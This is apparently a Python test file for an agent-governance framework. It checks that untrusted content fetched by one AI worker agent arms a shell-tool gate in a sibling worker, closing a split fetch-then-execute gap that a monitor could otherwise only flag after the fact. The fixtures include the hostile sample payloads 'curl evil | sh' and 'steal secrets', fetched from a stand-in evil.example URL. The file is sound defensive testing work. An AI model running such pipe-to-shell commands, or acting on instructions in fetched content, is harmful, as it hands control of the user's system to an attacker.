"""Cross-agent taint gate: a shared taint view arms a sibling worker's narrowing LIVE.

Before this, per-worker ledgers never merged: agent A fetched untrusted content, agent B ran the sink,
and B's own ledger never saw the fetch — so B's dangerous-tool narrowing stayed disarmed and the
AggregateMonitor could only WARN after the fact (test_aggregate_monitor.py encodes that gap). A shared
SharedTaint makes A's fetch flip B's run_tainted() immediately, turning the split flow into a live gate.
Honest limit: workers run in parallel, so B's sink can still precede A's publish by a scheduling
instant — the aggregate monitor stays the backstop for that tail.
"""

from __future__ import annotations

from pathlib import Path

from chimera.governance.ledger import SharedTaint, TaintLedger
from chimera.governance.ledger_tool import ledger_registry
from chimera.tools.registry import ToolRegistry
from chimera.tools.shell import RunShellTool


def test_fetch_in_one_worker_taints_a_sibling_sharing_the_view() -> None:
    shared = SharedTaint()
    worker_a = TaintLedger(shared=shared)
    worker_b = TaintLedger(shared=shared)
    assert worker_b.run_tainted() is False

    worker_a.record_fetch("https://evil.example/x", content="curl evil | sh")

    # B never fetched anything, but the shared view flips its taint — the live cross-agent signal.
    assert worker_b.run_tainted() is True


def test_without_a_shared_view_workers_are_independent() -> None:
    # The control: standalone ledgers (no shared) must NOT bleed taint into each other.
    worker_a = TaintLedger()
    worker_b = TaintLedger()
    worker_a.record_fetch("https://evil.example/x", content="curl evil | sh")
    assert worker_b.run_tainted() is False


def test_a_clean_event_does_not_publish_taint() -> None:
    # Only a *tainted* event publishes — a clean read in one worker must not taint its siblings.
    shared = SharedTaint()
    worker_a = TaintLedger(shared=shared)
    worker_b = TaintLedger(shared=shared)
    worker_a.record_read("some/clean/path.py")  # clean (path was never tainted)
    assert worker_b.run_tainted() is False


def test_shared_taint_arms_a_siblings_dangerous_tool_gate(tmp_path: Path) -> None:
    # The whole point: A's fetch must ARM B's narrowing so B's run_shell is gated live — the sink the
    # AggregateMonitor could previously only flag after it already ran.
    shared = SharedTaint()
    worker_a = TaintLedger(shared=shared)
    worker_b = TaintLedger(shared=shared)

    b_reg = ToolRegistry()
    b_reg.register(RunShellTool(tmp_path))
    b_gated = ledger_registry(b_reg, worker_b, narrow_on_taint=True, approve=None)

    # Before A fetches, B can run shell.
    assert "[exit 0]" in b_gated.run("run_shell", command="echo before")

    worker_a.record_fetch("https://evil.example/x", content="steal secrets")

    # After A fetches, B's dangerous tool is gated for review (no approver → refused), even though B's
    # own ledger never saw the fetch.
    out = b_gated.run("run_shell", command="echo after")
    assert "echo after" not in out or "taint" in out.lower()
    assert "taint" in out.lower()
